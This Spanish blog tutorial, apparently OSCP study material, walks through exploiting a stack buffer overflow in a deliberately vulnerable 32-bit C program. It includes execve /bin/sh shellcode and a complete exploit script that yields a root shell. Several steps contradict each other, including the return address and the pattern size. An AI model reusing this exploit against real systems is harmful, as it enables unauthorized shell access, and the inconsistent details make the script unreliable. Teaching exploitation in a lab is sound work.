---
title: Buffer Overflow Linux_x86 (Stack Based)
author: 
date: 2023-02-07
img_path: /assets/img/Otros/bof
categories: [HackTheBox, Buffer Overflow, OSCP]
tags: [HackTheBox]
image:
  path: bof.png
  alt: Buffer Overflow Linux (Stack Based)
---

Holi holi! El día de hoy vamos a estar explotando un **Buffer Overflow** de los más básicos, también llamado **Stack Based**, en este caso va a ser de **Linux** de 32 bits. En este post junto con el siguiente os enseñaré como explotar el Stack Based, que es el que según he oido, el que entra en el exámen de la certificación **Offensive Security Certified Professional**, también llamada **OSCP**. Espero que os guste

## Preparación

Iniciaremos con un ejemplo básico vulnerable, como el siguiente código en C
```c
#include <string.h>
#include <stdio.h>
void main(int argc, char *argv[]) {
    copier(argv[1]);
    printf("Buffer Overflow!\n");
}
int copier(char *str) {
    char buffer[128];
    strcpy(buffer, str);
}
```

Podemos ver que el buffer asignado al binario es 128, pero en este caso la vulnerabilidad proviene de usar la función `strcpy` con el input que proporciona el usuario.

```c
    char buffer[128];
    strcpy(buffer, str);
```

Antes de la explotación, deshabilitaremos el ASLR en nuestra máquina, el archivo `/proc/sys/kernel/randomize_va_space` ha de valer 0

```plaintext
> echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Tendremos que compilar el archivo en C con ayuda de `gcc` con los siguientes parámetros para deshabilitar las protecciones del binario que vienen por defecto

```plaintext
vuln.c                # El nombre del archivo en C
-m32                  # Indica que se compile para sistemas de 32 bits (x86)
-z execstack          # Nos permite que podamos ejecutar instrucciones en la pila
-fno-stack-protector  # Deshabilita la protección en la pila
-no-pie               # Deshabilita el Position Independent Executables
-o binary             # Exporta el código al binario
```

Lo compilamos y nos crea el binario que nos muestra "Buffer Overflow"

```plaintext
❯ gcc vuln.c -m32 -z execstack -fno-stack-protector -no-pie -o binary
vuln.c: In function ‘main’:
vuln.c:4:5: warning: implicit declaration of function ‘copier’ [-Wimplicit-function-declaration]
    4 |     copier(argv[1]);
      |     ^~~~~~

❯ ls
 binary   vuln.c

❯ ./binary hola
Buffer Overflow!
```

## Explotación

Gracias a los parámetros indicados durante la compilación del binario, podemos ver las protecciones deshabilitadas

```plaintext
❯ checksec binary
[*] '/home/l4nder/Escritorio/Otros/boflinux/binary'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

Para empezar usaremos gdb, es un buen debugger de Linux, en mi caso tengo [GEF](https://github.com/hugsy/gef) instalado porque me facilita la explotación

```plaintext
❯ gdb -q ./binary
Reading symbols from ./binary...
(No debugging symbols found in ./binary)
gef➤  
```

Para buscar el offset del binario crearemos un patrón especial de 200 bytes

```plaintext
gef➤  pattern create 300
[+] Generating a pattern of 300 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac
gef➤  
```

Al correr el binario junto con el argumento, nos devuelve el valor de todos los registros del binario, el que nos interesa es el **EIP** o el **Instruction Pointer**

```plaintext
gef➤ r aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaan...

───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd150  →  "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[...]"
$ebx   : 0x62616169 ("iaab"?)
$ecx   : 0xffffd570  →  "acxaacyaac"
$edx   : 0xffffd272  →  "acxaacyaac"
$esp   : 0xffffd1e0  →  "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"
$ebp   : 0x6261616a ("jaab"?)
$esi   : 0x804bf04  →  0x8049130  →  <__do_global_dtors_aux+0> endbr32 
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x6261616b ("kaab"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd1e0│+0x0000: "laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxa[...]"	← $esp
0xffffd1e4│+0x0004: "maabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabya[...]"
0xffffd1e8│+0x0008: "naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabza[...]"
0xffffd1ec│+0x000c: "oaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacba[...]"
0xffffd1f0│+0x0010: "paabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaacca[...]"
0xffffd1f4│+0x0014: "qaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacda[...]"
0xffffd1f8│+0x0018: "raabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaacea[...]"
0xffffd1fc│+0x001c: "saabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfa[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Seguido de esto calcularemos la cantidad de bytes que necesitamos escribir hasta reescribir el EIP

```plaintext
gef➤  pattern offset $eip
[+] Found at offset 140 (little-endian search) likely
```

Con el offset calculado, empezaremos con el script de python, vamos a definir el offset

```python
#!/usr/bin/python3

offset = 140
```

Definiremos un [Shellcode](https://www.exploit-db.com/shellcodes/13628) que nos ejecute una `/bin/sh` para conseguir una shell

```python
#!/usr/bin/python3

offset = 140

shellcode = b""
shellcode += b"\x6a\x0b\x58\x99\x52\x68\x2f"
shellcode += b"\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += b"\x6e\x89\xe3\x31\xc9\xcd\x80"
```

No podemos pasarnos de 140 bytes de junk, porque si lo hacemos sobreescribiermos el EIP, así que el junk será el offset menos lo largo que es el shellcode, así que al restarlo sigue siento 140

```python
#!/usr/bin/python3

offset = 140

shellcode = b""
shellcode += b"\x6a\x0b\x58\x99\x52\x68\x2f"
shellcode += b"\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += b"\x6e\x89\xe3\x31\xc9\xcd\x80"

junk = b"\x90" * (offset - len(shellcode))
```

Usamos '\x90' para rellenar el espacio hasta llegar al EIP, dado que los '\x90' son "nops" (No Operation), lo que hace es apuntar a la siguiente dirección, lo que nos permite desplazar la pila y no tener que apuntar exactamente al shellcode

Rellenaremos el lugar de la dirección del EIP con BBBB para poder debuguear (Aqui reescribo el exploit para más comodidad)

```python
#!/usr/bin/python3

#!/usr/bin/python3 

offset = 140
junk = "A" * offset

eip = "BBBB"

payload = junk + eip

print(payload)
```

Ejecutamos el programa de nuevo ahora pasandole el exploit ejecutado como argumento

```plaintext
gef➤  r $(python2 exploit.py)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd1e0  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xffffd570  →  "AAAAAABBBB"
$edx   : 0xffffd266  →  "AAAAAABBBB"
$esp   : 0xffffd270  →  0xffffd400  →  0x178bfbff
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0x804bf04  →  0x8049130  →  <__do_global_dtors_aux+0> endbr32 
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd270│+0x0000: 0xffffd400  →  0x178bfbff	← $esp
0xffffd274│+0x0004: 0xf7fc1678  →  0xf7ffdbac  →  0xf7fc1790  →  0xf7ffda40  →  0x00000000
0xffffd278│+0x0008: 0xf7fc1b40  →  0xf7c1f2bc  →  "GLIBC_PRIVATE"
0xffffd27c│+0x000c: 0x804917a  →  <main+20> add ebx, 0x2e7a
0xffffd280│+0x0010: 0xffffd2a0  →  0x00000002
0xffffd284│+0x0014: 0xf7e1cff4  →  0x0021cd8c
0xffffd288│+0x0018: 0x00000000
0xffffd28c│+0x001c: 0xf7c23295  →   add esp, 0x10
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Hemos dado en el clavo, el offset es correcto, ahora vamos a volver al exploit anterior.

```python
#!/usr/bin/python3

offset = 140

shellcode  = b""
shellcode += b"\x6a\x0b\x58\x99\x52\x68\x2f"
shellcode += b"\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += b"\x6e\x89\xe3\x31\xc9\xcd\x80"

junk = b"\x90" * (offset - len(shellcode))

eip = b"B" * 4

print(junk + shellcode + eip)
```

Ejecutamos el binario con el script como argumento

```plaintext
gef➤ r $(python2 exploit.py)
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xffffd1e0  →  0x90909090
$ebx   : 0xe3896e69
$ecx   : 0xffffd570  →  0xc931e389
$edx   : 0xffffd266  →  0xc931e389
$esp   : 0xffffd270  →  0xffffd400  →  0x178bfbff
$ebp   : 0x80cdc931
$esi   : 0x804bf04  →  0x8049130  →  <__do_global_dtors_aux+0> endbr32 
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x42424242 ("BBBB"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd270│+0x0000: 0xffffd400  →  0x178bfbff	← $esp
0xffffd274│+0x0004: 0xf7fc1678  →  0xf7ffdbac  →  0xf7fc1790  →  0xf7ffda40  →  0x00000000
0xffffd278│+0x0008: 0xf7fc1b40  →  0xf7c1f2bc  →  "GLIBC_PRIVATE"
0xffffd27c│+0x000c: 0x804917a  →  <main+20> add ebx, 0x2e7a
0xffffd280│+0x0010: 0xffffd2a0  →  0x00000002
0xffffd284│+0x0014: 0xf7e1cff4  →  0x0021cd8c
0xffffd288│+0x0018: 0x00000000
0xffffd28c│+0x001c: 0xf7c23295  →   add esp, 0x10
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Ahora en la pila buscaremos la dirección que tenga los nops (0x90909090)

```plaintext
gef➤  x/300wx $esp
0xffffd270:	0xffffd400	0xf7fc1678	0xf7fc1b40	0x0804917a
0xffffd280:	0xffffd2a0	0xf7e1cff4	0x00000000	0xf7c23295
0xffffd290:	0x00000000	0x00000070	0xf7ffcff4	0xf7c23295
0xffffd2a0:	0x00000002	0xffffd354	0xffffd360	0xffffd2c0
0xffffd2b0:	0xf7e1cff4	0x08049166	0x00000002	0xffffd354
0xffffd2c0:	0xf7e1cff4	0x0804bf04	0xf7ffcb80	0x00000000
0xffffd2d0:	0xf5a2767b	0x8e639c6b	0x00000000	0x00000000
0xffffd2e0:	0x00000000	0xf7ffcb80	0x00000000	0x43d67400
0xffffd2f0:	0xf7ffda40	0xf7c23226	0xf7e1cff4	0xf7c23358
0xffffd300:	0xf7fc9aec	0x0804bf04	0x00000000	0xf7ffd020
0xffffd310:	0x00000000	0xf7fdb8d0	0xf7c232d9	0x0804bff4
0xffffd320:	0x00000002	0x08049060	0x00000000	0x08049088
0xffffd330:	0x08049166	0x00000002	0xffffd354	0x00000000
0xffffd340:	0x00000000	0xf7fcd820	0xffffd34c	0xf7ffda40
0xffffd350:	0x00000002	0xffffd4bc	0xffffd4ea	0x00000000
0xffffd360:	0xffffd57b	0xffffd65d	0xffffd668	0xffffd679
0xffffd370:	0xffffd68e	0xffffd6b2	0xffffd6c3	0xffffd6d7
0xffffd380:	0xffffddbb	0xffffddcf	0xffffdddc	0xffffdde6
0xffffd390:	0xffffddf1	0xffffde04	0xffffde1d	0xffffde2e
0xffffd3a0:	0xffffde3c	0xffffde4a	0xffffde6d	0xffffde88
0xffffd3b0:	0xffffdea6	0xffffdec4	0xffffdecc	0xffffdef7
0xffffd3c0:	0xffffdf25	0xffffdf43	0xffffdf4f	0xffffdf63
0xffffd3d0:	0xffffdf6d	0xffffdf85	0xffffdfb5	0xffffdfbe
0xffffd3e0:	0x00000000	0x00000020	0xf7fc7550	0x00000021
0xffffd3f0:	0xf7fc7000	0x00000033	0x000006f0	0x00000010
0xffffd400:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xffffd410:	0x00000064	0x00000003	0x08048034	0x00000004
0xffffd420:	0x00000020	0x00000005	0x0000000b	0x00000007
0xffffd430:	0xf7fc9000	0x00000008	0x00000000	0x00000009
0xffffd440:	0x08049060	0x0000000b	0x00000000	0x0000000c
0xffffd450:	0x00000000	0x0000000d	0x00000000	0x0000000e
0xffffd460:	0x00000000	0x00000017	0x00000000	0x00000019
0xffffd470:	0xffffd49b	0x0000001a	0x00000002	0x0000001f
0xffffd480:	0xffffdfca	0x0000000f	0xffffd4ab	0x00000000
0xffffd490:	0x00000000	0x00000000	0x3c000000	0x9b43d674
0xffffd4a0:	0x3fc20503	0x5162972f	0x6913a052	0x00363836
0xffffd4b0:	0x00000000	0x00000000	0x00000000	0x6d6f682f
0xffffd4c0:	0x346c2f65	0x7265646e	0x6373452f	0x6f746972
0xffffd4d0:	0x2f6f6972	0x6f72744f	0x6f622f73	0x6e696c66
0xffffd4e0:	0x622f7875	0x72616e69	0x90900079	0x90909090
0xffffd4f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd500:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd510:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd520:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd530:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd540:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd550:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd560:	0x580b6a90	0x2f685299	0x6868732f	0x6e69622f
0xffffd570:	0xc931e389	0x424280cd	0x50004242	0x3d485441
0xffffd580:	0x6f6f722f	0x632e2f74	0x6f677261	0x6e69622f
0xffffd590:	0x6f722f3a	0x2e2f746f	0x61636f6c	0x69622f6c
0xffffd5a0:	0x732f3a6e	0x2f70616e	0x3a6e6962	0x7273752f
0xffffd5b0:	0x6e61732f	0x786f6264	0x752f3a2f	0x6c2f7273
0xffffd5c0:	0x6c61636f	0x6e69622f	0x73752f3a	0x69622f72
0xffffd5d0:	0x622f3a6e	0x2f3a6e69	0x2f727375	0x61636f6c
0xffffd5e0:	0x61672f6c	0x3a73656d	0x7273752f	0x6d61672f
0xffffd5f0:	0x2f3a7365	0x2f727375	0x72616873	0x61672f65
0xffffd600:	0x3a73656d	0x7273752f	0x636f6c2f	0x732f6c61
0xffffd610:	0x3a6e6962	0x7273752f	0x6962732f	0x732f3a6e
0xffffd620:	0x3a6e6962	0x7273752f	0x636f6c2f	0x622f6c61
0xffffd630:	0x2f3a6e69	0x2f727375	0x3a6e6962	0x6e69622f
0xffffd640:	0x73752f3a	0x6f6c2f72	0x2f6c6163	0x656d6167
0xffffd650:	0x752f3a73	0x672f7273	0x73656d61	0x53494400
0xffffd660:	0x59414c50	0x00303a3d	0x474e414c	0x5f73653d
0xffffd670:	0x552e5345	0x382d4654	0x47445800	0x5255435f
0xffffd680:	0x544e4552	0x5345445f	0x504f544b	0x4158003d
0xffffd690:	0x4f485455	0x59544952	0x6f682f3d	0x6c2f656d
0xffffd6a0:	0x65646e34	0x582e2f72	0x68747561	0x7469726f
0xffffd6b0:	0x45540079	0x783d4d52	0x6d726574	0x74696b2d
0xffffd6c0:	0x43007974	0x524f4c4f	0x4d524554	0x7572743d
0xffffd6d0:	0x6c6f6365	0x4c00726f	0x4f435f53	0x53524f4c
0xffffd6e0:	0x3d73723d	0x69643a30	0x3b31303d	0x6c3a3433
0xffffd6f0:	0x31303d6e	0x3a36333b	0x303d686d	0x69703a30
0xffffd700:	0x3b30343d	0x733a3333	0x31303d6f	0x3a35333b
0xffffd710:	0x303d6f64	0x35333b31	0x3d64623a	0x333b3034
gef➤  
```

Nos quedaremos con el campo que en los 4 campos unicamente tenga nops (0x90909090)

```plaintext
0xffffd510:	0x90909090	0x90909090	0x90909090	0x90909090
```

Ya que estamos en little endian tendremos que darle la vuelta a la direccion de esta forma

```plaintext
0xffffd510 -> \xff\xff\xd5\x10 -> \x10\xd5\xff\xff
```

Nuestro script final para explotarlo quedaría de esta forma

```python
#!/usr/bin/python3

offset = 140

shellcode = b""
shellcode += b"\x6a\x0b\x58\x99\x52\x68\x2f"
shellcode += b"\x2f\x73\x68\x68\x2f\x62\x69"
shellcode += b"\x6e\x89\xe3\x31\xc9\xcd\x80"

junk = b"\x90" * (offset - len(shellcode))

eip = b"\xa0\xd9\xff\xff"

print(junk + shellcode + eip)
```

Ejecutamos el binario con el exploit y nos lanza una sh, lo hemos conseguido

```plaintext
❯ ./binary $(python2 exploit.py)
# whoami
root
#
```

Bueno, este ha sido el más facil. En un futuro nos adentraremos más en el mundo del Buffer Overflow!
